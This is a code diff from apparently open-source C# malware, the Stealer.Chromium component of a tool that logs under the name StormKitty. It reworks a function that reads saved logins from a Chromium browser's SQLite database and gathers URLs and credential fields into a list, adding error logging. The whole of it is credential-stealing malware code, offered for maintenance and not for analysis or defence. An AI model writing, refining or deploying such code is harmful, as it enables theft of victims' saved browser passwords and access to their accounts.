@@ -11,18 +11,15 @@ namespace Stealer.Chromium
         /// <returns>List with passwords</returns>
         public static List<Password> Get(string sLoginData)
         {
+            List<Password> pPasswords = new List<Password>();
             try
             {
-                List<Password> pPasswords = new List<Password>();
-
                 // Read data from table
                 SQLite sSQLite = SqlReader.ReadTable(sLoginData, "logins");
-                if (sSQLite == null)
-                    return pPasswords;
+                if (sSQLite == null) return pPasswords;
 
                 for (int i = 0; i < sSQLite.GetRowCount(); i++)
                 {
-
                     Password pPassword = new Password();
 
                     pPassword.sUrl = Crypto.GetUTF8(sSQLite.GetValue(i, 0));
@@ -42,9 +39,9 @@ namespace Stealer.Chromium
 
                 }
 
-                return pPasswords;
             }
-            catch { return new List<Password>(); }
+            catch (System.Exception ex) { StormKitty.Logging.Log("Chromium >> Failed collect passwords\n" + ex); }
+            return pPasswords;
         }
     }
 }
